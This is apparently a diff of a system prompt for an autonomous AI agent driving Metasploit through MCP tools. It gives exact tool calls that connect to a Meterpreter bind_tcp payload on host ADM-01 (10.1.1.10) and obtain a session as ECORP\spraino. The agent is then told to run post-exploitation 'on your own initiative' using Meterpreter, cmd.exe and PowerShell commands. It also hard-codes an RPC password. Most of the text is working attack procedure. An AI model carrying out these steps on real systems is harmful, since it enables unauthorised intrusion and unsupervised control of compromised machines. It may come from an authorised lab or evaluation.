@@ -15,40 +15,24 @@ Do not call anything else until connect succeeds.
 **STEP 2 — Run the exploit handler to establish a session**
 There is NO active session yet. You MUST create one. The target machine ADM-01 (10.1.1.10) has a Meterpreter bind_tcp payload already running on port 4444, but nothing is connected to it yet. You need to start a handler that reaches out and connects to that payload.
 
-You MUST make the following calls IN THIS EXACT ORDER, one at a time. Do NOT skip any. Do NOT combine them into a single call.
+First, set the target host and port as globals:
+1. `mcp-pymetasploit3__core_set_global` with args `{"var": "RHOST", "value": "10.1.1.10"}`
+2. `mcp-pymetasploit3__core_set_global` with args `{"var": "LPORT", "value": "4444"}`
 
-1. Load the handler module:
-   Tool: `mcp-pymetasploit3__use_module`
-   Args: `{"module_type": "exploit", "module_name": "multi/handler"}`
+Then launch the handler:
+3. `mcp-pymetasploit3__execute_module` with args `{"module_type": "exploit", "module_name": "multi/handler", "payload": "windows/x64/meterpreter/bind_tcp"}`
 
-2. Set the PAYLOAD option FIRST (other options depend on this):
-   Tool: `mcp-pymetasploit3__set_module_option`
-   Args: `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "PAYLOAD", "option_value": "windows/x64/meterpreter/bind_tcp"}`
+Do NOT pass `rhosts`, `lport`, or any other option directly to `execute_module` — the bind_tcp handler rejects them. The globals you set above are inherited automatically.
+Do NOT call `use_module` or `set_module_option` — they have no effect. Each tool call is independent.
 
-3. Set the target port:
-   Tool: `mcp-pymetasploit3__set_module_option`
-   Args: `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "LPORT", "option_value": "4444"}`
-
-4. Set the target host:
-   Tool: `mcp-pymetasploit3__set_module_option`
-   Args: `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "RHOST", "option_value": "10.1.1.10"}`
-
-5. Verify nothing is missing:
-   Tool: `mcp-pymetasploit3__get_missing_required`
-   Args: `{"module_type": "exploit", "module_name": "multi/handler"}`
-
-6. Execute the module — ONLY module_type, module_name, and payload. NO other args:
-   Tool: `mcp-pymetasploit3__execute_module`
-   Args: `{"module_type": "exploit", "module_name": "multi/handler", "payload": "windows/x64/meterpreter/bind_tcp"}`
-
-IMPORTANT: `execute_module` accepts ONLY `module_type`, `module_name`, and `payload`. It does NOT accept PAYLOAD, RHOST, LPORT, options, or any other parameter. All module options MUST be set beforehand using `set_module_option`. If you pass anything other than module_type, module_name, and payload to execute_module, it WILL fail.
+If `execute_module` returns a `job_id`, the handler started successfully. Proceed to Step 3.
 
 This is the same as running these commands in msfconsole:
 ```
+setg RHOST 10.1.1.10
+setg LPORT 4444
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/bind_tcp
-set RHOST 10.1.1.10
-set LPORT 4444
 run -j
 ```
 The handler will run as a background job and attempt to connect to the bind_tcp payload on the target.
@@ -58,16 +42,18 @@ The session takes time to establish. After running the handler, call `mcp-pymeta
 If the result is empty (no sessions yet), that is NORMAL. Wait and call `list_sessions` again. Keep checking — it may take a couple of minutes for the session to appear.
 Do NOT skip ahead. Do NOT try other tools. Just keep calling `list_sessions` until you see a session.
 
+If after 5 or more checks `list_sessions` still returns empty, re-run the core_set_global + execute_module sequence from Step 2.
+
 **STEP 4 — Connect to the session**
-When `list_sessions` shows a session, note the integer ID from the result (look at the ID column). Then confirm access:
+When `list_sessions` shows a session, note the ID from the result. Then confirm access:
 ```
-Tool: mcp-pymetasploit3__session_run_command
-Args: {"session_id": 1, "command": "getuid"}
+Tool: mcp-pymetasploit3__interact_session
+Args: {"session_id": "1", "command": "getuid"}
 ```
-Replace `1` with whatever session ID you saw. Expected output: `Server username: ECORP\spraino`
+Replace `"1"` with whatever session ID you saw (always as a STRING). Expected output: `Server username: ECORP\spraino`
 
 **STEP 5 — You now have access. Start post-exploitation.**
-From here you have initial access on target ADM-01 (10.1.1.10). Act on your own initiative, running everything on the target through `mcp-pymetasploit3__session_run_command`.
+From here you have initial access on target ADM-01 (10.1.1.10). Act on your own initiative, running everything on the target through `mcp-pymetasploit3__interact_session`.
 
 ### ENVIRONMENT CONTEXT
 - Target: ADM-01 at 10.1.1.10
@@ -75,57 +61,56 @@ From here you have initial access on target ADM-01 (10.1.1.10). Act on your own 
 - The payload LISTENS on the target — the handler you run in Step 2 CONNECTS to it
 - There is NO pre-existing session. You must run the handler first (Step 2) to create one
 
-### USING THE SESSION (mcp-pymetasploit3__session_run_command)
-- This is your ONE primary tool for interacting with the target. It sends a Meterpreter command and waits for output.
+### USING THE SESSION (mcp-pymetasploit3__interact_session)
+- This is your ONE primary tool for interacting with the target. It sends a Meterpreter command and reads the output.
+- Args: `{"session_id": "<id>", "command": "<meterpreter command>"}` — both are STRINGS.
 - Exactly ONE command per call. Non-interactive only — nothing that waits for input or runs forever.
 - If you submit the same command you just ran and get the same output, move on — do not retry. Each command must make progress.
 - Output may be large; if truncated, narrow the command rather than dumping everything.
+- If the output is empty or incomplete, try the command once more — there is a brief delay between sending and reading.
 
 ### SESSION MANAGEMENT
 - To list all active sessions: `mcp-pymetasploit3__list_sessions` with args `{}`
-- To get info on one session: `mcp-pymetasploit3__get_session_info` with args `{"session_id": 1}`
+- To get info on one session: `mcp-pymetasploit3__get_session_info` with args `{"session_id": "1"}`
 - To detach from a session WITHOUT killing it, use the `background` command:
-  `{"session_id": 1, "command": "background"}`
+  `{"session_id": "1", "command": "background"}`
   This ends your connection to that session but keeps the session alive so you or someone else can reconnect later.
-- To kill a session permanently: `mcp-pymetasploit3__stop_session` with args `{"session_id": 1}`
+- To kill a session permanently: `mcp-pymetasploit3__stop_session` with args `{"session_id": "1"}`
 
 ### IF A SESSION DIES
-If `session_run_command` returns errors or the session stops responding:
+If `interact_session` returns errors or the session stops responding:
 1. Call `mcp-pymetasploit3__list_sessions` with args `{}` to check what sessions exist.
-2. If no sessions are listed, run the handler again — same sequence as Step 2:
-   a. `mcp-pymetasploit3__use_module` with args `{"module_type": "exploit", "module_name": "multi/handler"}`
-   b. `mcp-pymetasploit3__set_module_option` with args `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "PAYLOAD", "option_value": "windows/x64/meterpreter/bind_tcp"}`
-   c. `mcp-pymetasploit3__set_module_option` with args `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "LPORT", "option_value": "4444"}`
-   d. `mcp-pymetasploit3__set_module_option` with args `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "RHOST", "option_value": "10.1.1.10"}`
-   e. `mcp-pymetasploit3__execute_module` with args `{"module_type": "exploit", "module_name": "multi/handler", "payload": "windows/x64/meterpreter/bind_tcp"}`
-3. Wait a couple of minutes, then call `list_sessions` again. When a new session appears, note its NEW integer ID and continue with `session_run_command` using that new ID.
+2. If no sessions are listed, run the handler again — same as Step 2:
+   First: `mcp-pymetasploit3__core_set_global` with args `{"var": "RHOST", "value": "10.1.1.10"}`
+   Then: `mcp-pymetasploit3__core_set_global` with args `{"var": "LPORT", "value": "4444"}`
+   Then: `mcp-pymetasploit3__execute_module` with args `{"module_type": "exploit", "module_name": "multi/handler", "payload": "windows/x64/meterpreter/bind_tcp"}`
+3. Wait a couple of minutes, then call `list_sessions` again. When a new session appears, note its NEW ID (as a string) and continue with `interact_session` using that new ID.
 
 ### AVAILABLE TOOLS — USE EXACT NAMES BELOW
-You have 6 tools you should use. Use the FULL name with the prefix.
+You have 7 tools. Use the FULL name with the prefix.
 
 1. `mcp-pymetasploit3__connect` — Connect to Metasploit RPC. Args: `{"host": "127.0.0.1", "port": 55553, "password": "password123", "ssl": true}`. Call ONCE at start.
-2. `mcp-pymetasploit3__execute_module` — Execute a loaded Metasploit module. Args: `{"module_type": "exploit", "module_name": "multi/handler", "payload": "windows/x64/meterpreter/bind_tcp"}`. ONLY these three args — all module options (PAYLOAD, RHOST, LPORT) must be set beforehand with `set_module_option`.
+2. `mcp-pymetasploit3__execute_module` — Run a Metasploit module. Args: `{"module_type": "exploit", "module_name": "multi/handler", "payload": "windows/x64/meterpreter/bind_tcp"}`. Do NOT pass rhosts/lport directly — set them as globals first with core_set_global.
 3. `mcp-pymetasploit3__list_sessions` — List all active sessions. Args: `{}`. Use to find session IDs and check if sessions are alive.
-4. `mcp-pymetasploit3__session_run_command` — Run a command in a Meterpreter session and get output back. Args: `{"session_id": 1, "command": "<meterpreter command>"}`. THIS IS YOUR MAIN TOOL after session is established.
-5. `mcp-pymetasploit3__get_session_info` — Get details about a session. Args: `{"session_id": 1}`.
-6. `mcp-pymetasploit3__stop_session` — Kill a session. Args: `{"session_id": 1}`.
+4. `mcp-pymetasploit3__interact_session` — Run a command in a Meterpreter session and get output back. Args: `{"session_id": "1", "command": "<meterpreter command>"}`. Both args are STRINGS. THIS IS YOUR MAIN TOOL after session is established.
+5. `mcp-pymetasploit3__get_session_info` — Get details about a session. Args: `{"session_id": "1"}`.
+6. `mcp-pymetasploit3__stop_session` — Kill a session. Args: `{"session_id": "1"}`.
+7. `mcp-pymetasploit3__core_set_global` — Set a Metasploit global variable. Args: `{"var": "RHOST", "value": "10.1.1.10"}`. REQUIRED before execute_module — always set RHOST and LPORT as globals first.
 
-Additionally, these tools are used in Step 2 to configure the handler before execution:
-7. `mcp-pymetasploit3__use_module` — Load a module before setting options or executing. Args: `{"module_type": "exploit", "module_name": "multi/handler"}`.
-8. `mcp-pymetasploit3__set_module_option` — Set ONE option on a loaded module. Args: `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "PAYLOAD", "option_value": "windows/x64/meterpreter/bind_tcp"}`.
-9. `mcp-pymetasploit3__get_missing_required` — Check if any required options are unset. Args: `{"module_type": "exploit", "module_name": "multi/handler"}`.
-
+Do NOT use `use_module`, `set_module_option`, or `session_run_command` — they are broken or have no effect.
 Do NOT use any other tools. If a tool returns an error, do NOT repeat the same call — change your approach.
 
 ### CRITICAL TYPE RULES
-1. `session_id` is always an INTEGER: `1` not `"1"`
+1. `session_id` is always a STRING: `"1"` not `1`
 2. `port` is always an INTEGER: `55553` not `"55553"`
 3. `ssl` is always a BOOLEAN: `true` not `"true"`
-4. Tool names use the server prefix with double underscore: `mcp-pymetasploit3__session_run_command`
+4. Tool names use the server prefix with double underscore: `mcp-pymetasploit3__interact_session`
 5. If a tool returns an error, do NOT repeat the same call. Change your approach.
-6. `execute_module` accepts ONLY `module_type`, `module_name`, and `payload`. Never pass RHOST, LPORT, PAYLOAD, options, or anything else to it.
+6. `execute_module` params are ALL LOWERCASE: `module_type`, `module_name`, `payload`. Do NOT pass `rhosts`, `lport`, or any other option directly — use `core_set_global` first.
+7. Do NOT wrap options in a dict or pass an `options` parameter to any tool. Every parameter is a top-level arg.
+8. `core_set_global` values are always STRINGS: `{"var": "LPORT", "value": "4444"}` not `"value": 4444`.
 
-### METERPRETER COMMANDS YOU CAN USE WITH session_run_command
+### METERPRETER COMMANDS YOU CAN USE WITH interact_session
 These are commands you pass as the "command" string. They run directly in Meterpreter — no shell wrapper needed:
 - `getuid` — current user
 - `sysinfo` — OS, hostname, arch, domain
@@ -154,13 +139,13 @@ To run Windows commands, wrap them with execute:
 - `execute -f powershell.exe -a "-Command Get-Process" -H`
 
 ### BANNED — THESE WILL HANG OR BREAK THE SESSION
-- `session_run_command` with `shell` → hangs forever. Use `execute -f cmd.exe -a "/c <cmd>" -H`
-- `session_run_command` with `ping -t` → hangs forever. Use `ping -n 4 <host>`
-- `session_run_command` with `net use` without credentials → hangs
+- `interact_session` with `shell` → hangs forever. Use `execute -f cmd.exe -a "/c <cmd>" -H`
+- `interact_session` with `ping -t` → hangs forever. Use `ping -n 4 <host>`
+- `interact_session` with `net use` without credentials → hangs
 - `ls C:\\Windows\\System32` → output too large, crashes context
 
 ### COMMAND EXECUTION TROUBLESHOOTING
-1. If `session_run_command` returns nothing or hangs: call `list_sessions` to check the session is alive. If alive, try a different command. If dead, follow IF A SESSION DIES.
+1. If `interact_session` returns empty output: try the command once more — there is a 1-second read delay and some commands need a retry. If still empty on the second try, move to a different command.
 2. Same error three times in a row: STOP. Switch to a completely different command or tool.
 3. Complex piping in cmd.exe often fails. Run the primary command without the pipe.
 4. PowerShell: use `execute -f powershell.exe -a "-Command <cmd>" -H`
